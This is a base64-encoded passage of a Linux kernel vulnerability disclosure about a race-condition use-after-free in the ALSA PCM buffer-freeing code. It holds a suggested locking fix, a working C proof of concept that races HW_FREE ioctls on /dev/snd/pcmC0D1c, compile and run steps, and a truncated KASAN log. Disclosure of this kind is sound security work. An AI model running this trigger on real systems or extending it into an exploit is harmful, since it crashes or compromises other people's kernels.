YSBuZXdseSBhbGxvY2F0ZWQgYnVmZmVyLiAgcmVsZWFzZSBpdCBub3cuICov
CgkJZG9fZnJlZV9wYWdlcyhjYXJkLCBydW50aW1lLT5kbWFfYnVmZmVyX3Ap
OwoJCWtmcmVlKHJ1bnRpbWUtPmRtYV9idWZmZXJfcCk7ICAgICAgLy8gICoq
KioqKioqIDIgKioqKioqKioKCX0KCXNuZF9wY21fc2V0X3J1bnRpbWVfYnVm
ZmVyKHN1YnN0cmVhbSwgTlVMTCk7CglyZXR1cm4gMDsKfQpgYGAKPT4gSXQg
d2lsbCBsZWFkIHRvIGEgdXNlLWFmdGVyLWZyZWUoZG91YmxlIGZyZWUpIGlz
c3VlIGluIHRoZSBrZXJuZWwuCgojIyBTdWdnZXN0aW9uCgpBZGQgYSBsb2Nr
IHRvIHRoZSBzbmRfcGNtX2xpYl9mcmVlX3BhZ2VzIGFuZCB1bmxvY2sgaXQg
d2hlbiByZXR1cm4uCgojIyBSZXBvcnRlcgoKS2lyaW4oQFB3bnJpbikgb2Yg
VGVuY2VudCBTZWN1cml0eSBYdWFud3UgTGFiCgojIyBQT0MKClRvIHRyaWdn
ZXIgdGhpcyB2dWxuZXJhYmlsaXR5IGF0ICgyKSwgdGhlIHBvYyBzaG91bGQg
YnlwYXNzIHRoZSBjaGVjayBpbiBzbmRfcGNtX2xpYl9mcmVlX3BhZ2VzOigx
KS4gQWN0dWFsbHksIHdoZXRoZXIgdG8gYXBwbHkgZm9yIG5ldyBtZW1vcnkg
aGVyZSBpcyByZWxhdGVkIHRvIHRoZSBzb3VuZCBkcml2ZXIgdXNlZCBpbiB0
aGUgc3lzdGVtLgpJZiB3ZSBhZGQgYSB2aXJ0dWFsIG1hY2hpbmUgaW4gVmly
dHVhbEJveCB3aXRoIFVidW50dS4gVGhlIGRlZmF1bHQgc291bmQgZHJpdmVy
IGlzIGludGVsOHgwLCBhbmQgaW4gdGhpcyBkcml2ZXIgd2UgY2FuIGFsbG9j
IGEgbmV3IGJ1ZmZlciBhbmQgYnlwYXNzIHRoZSBjaGVjayBpbiAoMSkgZWFz
aWx5LgooQnV0IGluIHRoZSBWbXdhcmUsIHRoZSBkcml2ZXIgaGFzIHJlcXVl
c3RlZCB0aGUgbWF4aW11bSBtZW1vcnkgc2l6ZSBpbiBhZHZhbmNlLiBUbyB0
cmlnZ2VyIHRoZSB2dWxuZXJhYmlsaXR5LCB3ZSBtdXN0IHdyaXRlIHRoZSAi
L3Byb2MveHh4L3h4eC9wcmVhbGxvYyIgZmlsZSBpbiBzb3VuZCBjYXJkIHRv
IGZvcmNlIHRoZSBkcml2ZXIgdG8gYXBwbHkgZm9yIGEgc21hbGxlciBidWZm
ZXIoaW4gZnVuY3Rpb24gc25kX3BjbV9saWJfcHJlYWxsb2NhdGVfcHJvY193
cml0ZSkgc28gdGhhdCB3ZSBjYW4gYWxsb2MgYSBuZXcgYnVmZmVyIGluIHNu
ZF9wY21fbGliX21hbGxvY19wYWdlcyBsYXRlci4pCioqVGhlIFBPQzoqKgpg
YGAKI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2lu
Y2x1ZGUgImFsc2EvYXNvdW5kbGliLmgiCiNpbmNsdWRlIDxzdGRib29sLmg+
CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxzeXMvbXNnLmg+
CiNpbmNsdWRlIDxzeXMvbW1hbi5oPgojaW5jbHVkZSA8c3lzL3dhaXQuaD4K
I2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8c3RyaW5nLmg+CiNpbmNs
dWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPGFycGEvaW5ldC5oPgojaW5jbHVk
ZSA8c3lzL3N0YXQuaD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxz
Y2hlZC5oPgojaW5jbHVkZSA8c3lzL2lvY3RsLmg+CiNpbmNsdWRlIDxzeXMv
dHlwZXMuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvaXBj
Lmg+CiNpbmNsdWRlIDxzeXMvbXNnLmg+CgojaW5jbHVkZSA8c3lzL3NvY2tl
dC5oPgojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4KI2luY2x1ZGUgPGxpbnV4
L2lmX3BhY2tldC5oPgojaW5jbHVkZSA8bGludXgvaWZfZXRoZXIuaD4KI2lu
Y2x1ZGUgPGxpbnV4L2lmX2FycC5oPgojaW5jbHVkZSA8c3lzL3NvY2tldC5o
PgojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4KI2luY2x1ZGUgPGxpbnV4L2lm
X3BhY2tldC5oPgojaW5jbHVkZSA8bGludXgvaWZfZXRoZXIuaD4KI2luY2x1
ZGUgPGxpbnV4L2lmX2FycC5oPgp0eXBlZGVmIHVuc2lnbmVkIGludCBfX3Uz
MjsKI2RlZmluZQlTTkRSVl9QQ01fSFdfUEFSQU1fQUNDRVNTCTAJLyogQWNj
ZXNzIHR5cGUgKi8KI2RlZmluZQlTTkRSVl9QQ01fSFdfUEFSQU1fRk9STUFU
CTEJLyogRm9ybWF0ICovCiNkZWZpbmUJU05EUlZfUENNX0hXX1BBUkFNX1NV
QkZPUk1BVAkyCS8qIFN1YmZvcm1hdCAqLwojZGVmaW5lCVNORFJWX1BDTV9I
V19QQVJBTV9GSVJTVF9NQVNLCVNORFJWX1BDTV9IV19QQVJBTV9BQ0NFU1MK
I2RlZmluZQlTTkRSVl9QQ01fSFdfUEFSQU1fTEFTVF9NQVNLCVNORFJWX1BD
TV9IV19QQVJBTV9TVUJGT1JNQVQKCiNkZWZpbmUJU05EUlZfUENNX0hXX1BB
UkFNX1NBTVBMRV9CSVRTCTgJLyogQml0cyBwZXIgc2FtcGxlICovCiNkZWZp
bmUJU05EUlZfUENNX0hXX1BBUkFNX0ZSQU1FX0JJVFMJOQkvKiBCaXRzIHBl
ciBmcmFtZSAqLwojZGVmaW5lCVNORFJWX1BDTV9IV19QQVJBTV9DSEFOTkVM
UwkxMAkvKiBDaGFubmVscyAqLwojZGVmaW5lCVNORFJWX1BDTV9IV19QQVJB
TV9SQVRFCQkxMQkvKiBBcHByb3ggcmF0ZSAqLwojZGVmaW5lCVNORFJWX1BD
TV9IV19QQVJBTV9QRVJJT0RfVElNRQkxMgkvKiBBcHByb3ggZGlzdGFuY2Ug
YmV0d2VlbgoJCQkJCQkgKiBpbnRlcnJ1cHRzIGluIHVzCgkJCQkJCSAqLwoj
ZGVmaW5lCVNORFJWX1BDTV9IV19QQVJBTV9QRVJJT0RfU0laRQkxMwkvKiBB
cHByb3ggZnJhbWVzIGJldHdlZW4KCQkJCQkJICogaW50ZXJydXB0cwoJCQkJ
CQkgKi8KI2RlZmluZQlTTkRSVl9QQ01fSFdfUEFSQU1fUEVSSU9EX0JZVEVT
CTE0CS8qIEFwcHJveCBieXRlcyBiZXR3ZWVuCgkJCQkJCSAqIGludGVycnVw
dHMKCQkJCQkJICovCiNkZWZpbmUJU05EUlZfUENNX0hXX1BBUkFNX1BFUklP
RFMJMTUJLyogQXBwcm94IGludGVycnVwdHMgcGVyCgkJCQkJCSAqIGJ1ZmZl
cgoJCQkJCQkgKi8KI2RlZmluZQlTTkRSVl9QQ01fSFdfUEFSQU1fQlVGRkVS
X1RJTUUJMTYJLyogQXBwcm94IGR1cmF0aW9uIG9mIGJ1ZmZlcgoJCQkJCQkg
KiBpbiB1cwoJCQkJCQkgKi8KI2RlZmluZQlTTkRSVl9QQ01fSFdfUEFSQU1f
QlVGRkVSX1NJWkUJMTcJLyogU2l6ZSBvZiBidWZmZXIgaW4gZnJhbWVzICov
CiNkZWZpbmUJU05EUlZfUENNX0hXX1BBUkFNX0JVRkZFUl9CWVRFUwkxOAkv
KiBTaXplIG9mIGJ1ZmZlciBpbiBieXRlcyAqLwojZGVmaW5lCVNORFJWX1BD
TV9IV19QQVJBTV9USUNLX1RJTUUJMTkJLyogQXBwcm94IHRpY2sgZHVyYXRp
b24gaW4gdXMgKi8KI2RlZmluZQlTTkRSVl9QQ01fSFdfUEFSQU1fRklSU1Rf
SU5URVJWQUwJU05EUlZfUENNX0hXX1BBUkFNX1NBTVBMRV9CSVRTCiNkZWZp
bmUJU05EUlZfUENNX0hXX1BBUkFNX0xBU1RfSU5URVJWQUwJU05EUlZfUENN
X0hXX1BBUkFNX1RJQ0tfVElNRQoKc3RydWN0IHNuZF9pbnRlcnZhbCB7Cgl1
bnNpZ25lZCBpbnQgbWluLCBtYXg7Cgl1bnNpZ25lZCBpbnQgb3Blbm1pbjox
LAoJCSAgICAgb3Blbm1heDoxLAoJCSAgICAgaW50ZWdlcjoxLAoJCSAgICAg
ZW1wdHk6MTsKfTsKCiNkZWZpbmUgU05EUlZfTUFTS19NQVgJMjU2CgpzdHJ1
Y3Qgc25kX21hc2sgewoJX191MzIgYml0c1soU05EUlZfTUFTS19NQVgrMzEp
LzMyXTsKfTsKCnR5cGVkZWYgc3RydWN0IHsKCWludCB2ZXJzaW9uOwoJaW50
IGZkOwoJaW50IGNhcmQsIGRldmljZSwgc3ViZGV2aWNlOwoKCXZvbGF0aWxl
IHN0cnVjdCBzbmRfcGNtX21tYXBfc3RhdHVzICogbW1hcF9zdGF0dXM7Cglz
dHJ1Y3Qgc25kX3BjbV9tbWFwX2NvbnRyb2wgKm1tYXBfY29udHJvbDsKCWJv
b2wgbW1hcF9zdGF0dXNfZmFsbGJhY2tlZDsKCWJvb2wgbW1hcF9jb250cm9s
X2ZhbGxiYWNrZWQ7CglzdHJ1Y3Qgc25kX3BjbV9zeW5jX3B0ciAqc3luY19w
dHI7CgoJaW50IHBlcmlvZF9ldmVudDsKCXNuZF90aW1lcl90ICpwZXJpb2Rf
dGltZXI7CglzdHJ1Y3QgcG9sbGZkIHBlcmlvZF90aW1lcl9wZmQ7CglpbnQg
cGVyaW9kX3RpbWVyX25lZWRfcG9sbDsKCS8qIHJlc3RyaWN0ZWQgcGFyYW1l
dGVycyAqLwoJc25kX3BjbV9mb3JtYXRfdCBmb3JtYXQ7CglpbnQgcmF0ZTsK
CWludCBjaGFubmVsczsKCS8qIGZvciBjaG1hcCAqLwoJdW5zaWduZWQgaW50
IGNobWFwX2NhcHM7CglzbmRfcGNtX2NobWFwX3F1ZXJ5X3QgKipjaG1hcF9v
dmVycmlkZTsKfSBzbmRfcGNtX2h3X3Q7CgpzdHJ1Y3Qgc25kX3BjbV9od19w
YXJhbXMgewoJdW5zaWduZWQgaW50IGZsYWdzOwoJc3RydWN0IHNuZF9tYXNr
IG1hc2tzW1NORFJWX1BDTV9IV19QQVJBTV9MQVNUX01BU0sgLQoJCQkgICAg
ICAgU05EUlZfUENNX0hXX1BBUkFNX0ZJUlNUX01BU0sgKyAxXTsKCXN0cnVj
dCBzbmRfbWFzayBtcmVzWzVdOwkvKiByZXNlcnZlZCBtYXNrcyAqLwoJc3Ry
dWN0IHNuZF9pbnRlcnZhbCBpbnRlcnZhbHNbU05EUlZfUENNX0hXX1BBUkFN
X0xBU1RfSU5URVJWQUwgLQoJCQkJICAgICAgICBTTkRSVl9QQ01fSFdfUEFS
QU1fRklSU1RfSU5URVJWQUwgKyAxXTsKCXN0cnVjdCBzbmRfaW50ZXJ2YWwg
aXJlc1s5XTsJLyogcmVzZXJ2ZWQgaW50ZXJ2YWxzICovCgl1bnNpZ25lZCBp
bnQgcm1hc2s7CQkvKiBXOiByZXF1ZXN0ZWQgbWFza3MgKi8KCXVuc2lnbmVk
IGludCBjbWFzazsJCS8qIFI6IGNoYW5nZWQgbWFza3MgKi8KCXVuc2lnbmVk
IGludCBpbmZvOwkJLyogUjogSW5mbyBmbGFncyBmb3IgcmV0dXJuZWQgc2V0
dXAgKi8KCXVuc2lnbmVkIGludCBtc2JpdHM7CQkvKiBSOiB1c2VkIG1vc3Qg
c2lnbmlmaWNhbnQgYml0cyAqLwoJdW5zaWduZWQgaW50IHJhdGVfbnVtOwkJ
LyogUjogcmF0ZSBudW1lcmF0b3IgKi8KCXVuc2lnbmVkIGludCByYXRlX2Rl
bjsJCS8qIFI6IHJhdGUgZGVub21pbmF0b3IgKi8KCXNuZF9wY21fdWZyYW1l
c190IGZpZm9fc2l6ZTsJLyogUjogY2hpcCBGSUZPIHNpemUgaW4gZnJhbWVz
ICovCgl1bnNpZ25lZCBjaGFyIHJlc2VydmVkWzY0XTsJLyogcmVzZXJ2ZWQg
Zm9yIGZ1dHVyZSAqLwp9OwppbnQgazsKaW50IG1hZ2ljX2ZkOwp1bnNpZ25l
ZCBjaGFyIGh3X3BhcmFtc19kYXRhW10gPQp7CiAgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwOCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
CiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwNCwgMHgwMCwgMHgw
MCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
CiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMSwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
CiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
CiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
CiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
CiAgMHgxMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgxMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwNCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgyMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgyMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwNCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMiwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MiwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwNCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHg0MCwgMHgxRiwgMHgwMCwgMHgwMCwgCiAgMHg4MCwgMHhCQiwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg1NSwgMHgzNSwg
CiAgMHgwNSwgMHgwMCwgMHgwMCwgMHg0MCwgMHgxRiwgMHgwMCwgMHgwMSwg
MHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHg0OCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHg0OCwgMHgwMCwgMHgwMCwgMHgwNCwgMHgwMCwgCiAgMHgwMCwg
MHgwMCwgMHgwMCwgMHgyMCwgMHgwMSwgMHgwMCwgMHgwMCwgMHgyMCwgMHgw
MSwgMHgwMCwgCiAgMHgwNCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMSwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMSwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgw
NCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg1NSwgMHgzNSwgMHgwNSwgMHgwMCwg
CiAgMHgwMCwgMHg0MCwgMHgxRiwgMHgwMCwgMHgwMSwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHg0OCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHg0OCwg
MHgwMCwgMHgwMCwgMHgwNCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwg
MHgyMCwgMHgwMSwgMHgwMCwgMHgwMCwgMHgyMCwgMHgwMSwgMHgwMCwgMHgw
NCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHhGRiwgMHhGRiwgMHhGRiwgMHhGRiwgCiAgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
CiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
CiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
CiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwNywg
MHhGRiwgMHgwNywgMHgwMCwgCiAgMHgwMywgMHgwMSwgMHgwRCwgMHg4MCwg
MHgxMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
CiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwg
MHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgCiAgMHgwMCwgMHgwMCwgMHgw
MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMAp9Owp2b2lkIHJhY2Uo
KXsKICB3aGlsZShrIT0xKXt9OwogIGlvY3RsKG1hZ2ljX2ZkLDB4NDExMiww
KTsKfQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQp7CiAgaW50
IGk7IAogIGludCBqOyAKICBpbnQgZmQ7IAogIHNuZF9wY21faHdfcGFyYW1z
X3QgKnB0cjsgCiAgc25kX3BjbV9od19wYXJhbXNfbWFsbG9jKCZwdHIpOwog
IG1lbWNweShwdHIsIGh3X3BhcmFtc19kYXRhLCAweDI2MCk7CiAgbWFnaWNf
ZmQgPSBvcGVuKCIvZGV2L3NuZC9wY21DMEQxYyIsIDApOwogIHByaW50Zigi
WytdIENIRUNLIEZEOiAlZFxuIixtYWdpY19mZCk7CiAgaW9jdGwobWFnaWNf
ZmQsIDB4QzI2MDQxMTEsIHB0cik7CiNkZWZpbmUgUkFDRV9OVU0gMjAKICBw
dGhyZWFkX3QgcmFjZV90aHJlYWRbUkFDRV9OVU1dPXt9OwogIGZvcihpbnQg
aT0wO2k8UkFDRV9OVU07aSsrKXsKICAgICAgcHRocmVhZF9jcmVhdGUoJnJh
Y2VfdGhyZWFkW2ldLE5VTEwscmFjZSxOVUxMKTsKICB9CiAgaz0xOwogIGZv
cihpbnQgaT0wO2k8UkFDRV9OVU07aSsrKXsKICAgICAgcHRocmVhZF9qb2lu
KHJhY2VfdGhyZWFkW2ldLE5VTEwpOwogIH0KICByZXR1cm4gMDsKfQpgYGAK
VG8gdHJpZ2dlciBpdCBlYXNpbHksIHBsZWFzZSBydW4gaXQgaW4gVmlydHVh
bEJveCB3aXRoIFVidW50dSh3aXRoIGxhdGVzdCBzdGFibGUga2VybmVsIHZl
cnNpb24pLCBhbmQgbWFrZSBzdXJlIHRoZSB1c2VyIGhhcyBwZXJtaXNzaW9u
IHRvIG9wZW4gIi9kZXYvc25kL3BjbUMwRDFjIihpbiB1c2VyIGdyb3VwOiBh
dWRpbykgOgpgYGAKc3VkbyBhcHQtZ2V0IGluc3RhbGwgbGliYXNvdW5kMi1k
ZXYKZ2NjIGV4cC5jIC1sYXNvdW5kIC1scHRocmVhZCAtbGRsIC1sbSAtbyBw
b2MKLi9wb2MgICMgSSBsb3N0IGEgc3RhYmxlIHZlcnNpb24gb2YgUE9DLCB5
b3UgbWF5IG5lZWQgdG8gcnVuIHRoZSBwb2MoYWJvdmUpIHNldmVyYWwgdGlt
ZXMgdG8gc2VlIGEga2FzYW4gbG9nIG9mIHVzZS1hZnRlci1mcmVlLgpgYGAK
CiMjIEtBU0FOIExPRyAKYGBgClsgIDE0MS41OTQxOTldIEJVRzogQmFkIHBh
Z2Ugc3RhdGUgaW4gcHJvY2VzcyBleHAgIHBmbjo3OTE0MApbICAxNDEuNTk0
MjAxXSA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT0KWyAgMTQxLjU5NDIxM10gQlVH
OiBLQVNBTjogdXNlLWFmdGVyLWZyZWUgaW4gc25kX2RtYV9mcmVlX3BhZ2Vz
KzB4MmNkLzB4MzgwIFtzbmRfcGNtXQpbICAxNDEuNTk0MjE3XSBSZWFkIG9m
IHNpemUgNCBhdCBhZGRyIGZmZmY4ODgwYjM0Yzk0MDAgYnkgdGFzayBleHAv
MTk1NgoKWyAgMTQxLjU5NDIyNF0gQ1BVOiAxIFBJRDogMTk1NiBDb21tOiBl
eHAgTm90IHRhaW50ZWQgNS40LjE2NiAjMQpbICAxNDEuNTk0MjI2XSBIYXJk
d2FyZSBuYW1lOiBpbm5vdGVrIEdtYkggVmlydHVhbEJveC9WaXJ0dWFsQm94
LCBCSU9TIFZpcnR1YWxCb3ggMTIvMDEvMjAwNgpbICAxNDEuNTk0MjI4XSBw
YWdlOmZmZmZlYTAwMDFlNDUwMDAgcmVmY291bnQ6LTEgbWFwY291bnQ6MCBt
YXBwaW5nOjAwMDAwMDAwMDAwMDAwMDAgaW5kZXg6MHgwIGNvbXBvdW5kX21h
cGNvdW50OiAwClsgIDE0MS41OTQyMzFdIGZsYWdzOiAweGZmZmZmYzAwMTAw
MDAoaGVhZCkKWyAgMTQxLjU5NDIzMl0gQ2FsbCBUcmFjZToKWyAgMTQxLjU5
NDI1M10gIGR1bXBfc3RhY2srMHg5Ni8weGM3ClsgIDE0MS41OTQyNTVdIHJh
dzogMDAwZmZmZmZjMDAxMDAwMCBkZWFkMDAwMDAwMDAwMTAwIGRlYWQwMDAw
MDAwMDAxMjIgMDAwMDAwMDAwMDAwMDAwMApbICAxNDEuNTk0MjY0XSAgcHJp
bnRfYWRkcmVzc19kZXNjcmlwdGlvbi5jb25zdHByb3AuMCsweDIwLzB4MjEw
ClsgIDE0MS41OTQyNjVdIHJhdzogMDAwMDAwMDAwMDAwMDAwMCAwMDAwMDAw
MDAwMDAwMDAwIGZmZmZmZmZmZmZmZmZmZmYgMDAwMDAwMDAwMDAwMDAwMApb
ICAxNDEuNTk0MjY2XSBwYWdlIGR1bXBlZCBiZWNhdXNlOiBub256ZXJvIF9y
ZWZjb3VudApbICAxNDEuNTk0MjcyXSAgPyBzbmRfZG1hX2ZyZWVfcGFnZXMr
MHgyY2QvMHgzODAgW3NuZF9wY21dClsgIDE0MS41OTQyNzVdICBfX2thc2Fu
X3JlcG9ydC5jb2xkKzB4MzcvMHg3NwpbICAxNDEuNTk0Mjc2XSBNb2R1bGVz
IGxpbmtlZCBpbjogbmxzX2lzbzg4NTlfMQpbICAxNDEuNTk0MjgzXSAgPyBz
bmRfZG1hX2ZyZWVfcGFnZXMrMHgyY2QvMHgzODAgW3NuZF9wY21dClsgIDE0
MS41OTQyODRdICBpbnRlbF9yYXBsX21zciBzbmRfaW50ZWw4eDAgc25kX2Fj
OTdfY29kZWMgYWM5N19idXMKWyAgMTQxLjU5NDI4OV0gIGthc2FuX3JlcG9y
dCsweDE0LzB4MjAKWyAgMTQxLjU5NDI4OV0gIHNuZF9wY20gc25kX3NlcV9t
aWRpClsgIDE0MS41OTQyOTNdICBfX2FzYW5fcmVwb3J0X2xvYWQ0X25vYWJv
cnQrMHgxNC8weDIwClsgIDE0MS41OTQyOTRdICBzbmRfc2VxX21pZGlfZXZl
bnQgc25kX3Jhd21pZGkKWyAgMTQxLjU5NDMwMF0gIHNuZF9kbWFfZnJlZV9w
YWdlcysweDJjZC8weDM4MCBbc25kX3BjbV0KWyAgMTQxLjU5NDMwMF0gIHNu
ZF9zZXEgaW50ZWxfcmFwbF9jb21tb24gY3JjdDEwZGlmX3BjbG11bApbICAx
NDEuNTk0MzA4XSAgc25kX3BjbV9saWJfZnJlZV9wYWdlcysweGM2LzB4MjUw
